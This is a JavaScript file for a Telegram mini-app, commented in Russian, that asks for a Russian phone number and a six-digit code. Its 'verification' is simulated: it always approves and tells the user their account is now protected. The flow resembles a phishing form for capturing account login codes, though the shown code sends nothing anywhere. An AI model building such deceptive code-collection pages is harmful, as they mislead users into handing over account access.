document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#060137');
    tg.setBackgroundColor('#060137');
    tg.enableClosingConfirmation();

    // Элементы DOM
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const submitCodeBtn = document.getElementById('submit-code');

    // Вибрация
    const vibrate = (type = 'light') => {
        if (tg.HapticFeedback) {
            tg.HapticFeedback.impactOccurred(type);
        }
    };

    // Форматирование номера телефона
    phoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 0) value = '7' + value.substring(1);
        
        let formatted = '+7';
        if (value.length > 1) formatted += ' ' + value.substring(1, 4);
        if (value.length > 4) formatted += ' ' + value.substring(4, 7);
        if (value.length > 7) formatted += '-' + value.substring(7, 9);
        if (value.length > 9) formatted += '-' + value.substring(9, 11);
        
        phoneInput.value = formatted.substring(0, 16);
        if (value.length % 2 === 0) vibrate('light');
    });

    // Валидация номера
    const validatePhone = (phone) => {
        const clean = phone.replace(/\D/g, '');
        return /^7\d{10}$/.test(clean);
    };

    // Отправка номера телефона
    document.getElementById('submit-phone').addEventListener('click', async () => {
        const phone = phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(phoneError, 'Введите номер телефона');
            vibrate('error');
            return;
        }
        
        if (!validatePhone(phone)) {
            showError(phoneError, 'Требуется российский номер: +7 XXX XXX-XX-XX');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(phoneError);
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        
        // Здесь можно добавить логику отправки SMS (через внешний API)
        // Например: 
        // await sendSMS(`+${phone}`, `Ваш код: ${generateCode()}`);
        //tg.showAlert(`Код подтверждения отправлен на номер +${phone}. Проверьте SMS.`);
    });

    // Отправка кода подтверждения
    submitCodeBtn.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        
        if (!/^\d{6}$/.test(code)) {
            showError(codeError, 'Ровно 6 цифр');
            vibrate('error');
            return;
        }
        
        vibrate('medium');
        hideError(codeError);
        submitCodeBtn.disabled = true;
        submitCodeBtn.innerHTML = '<div class="loader"></div>';
        
        // Имитация проверки кода (в реальности код проверяется вручную через SMS)
        setTimeout(() => {
            handleVerificationResult('approved'); // или 'rejected' для отклонения
        }, 1500); // Задержка для имитации проверки
    });

    // Обработка результата верификации
    function handleVerificationResult(status) {
        submitCodeBtn.disabled = false;
        submitCodeBtn.textContent = 'Подтвердить';
        
        if (status === 'approved') {
            tg.showAlert('✅ Подтверждено! Ваш аккаунт защищен.', () => {
                tg.close();
            });
        } else {
            showError(codeError, 'Неверный код. Попробуйте ещё раз');
            codeInput.value = '';
            vibrate('heavy');
        }
    }

    // Вспомогательные функции
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
    }

    function hideError(element) {
        element.style.display = 'none';
    }
});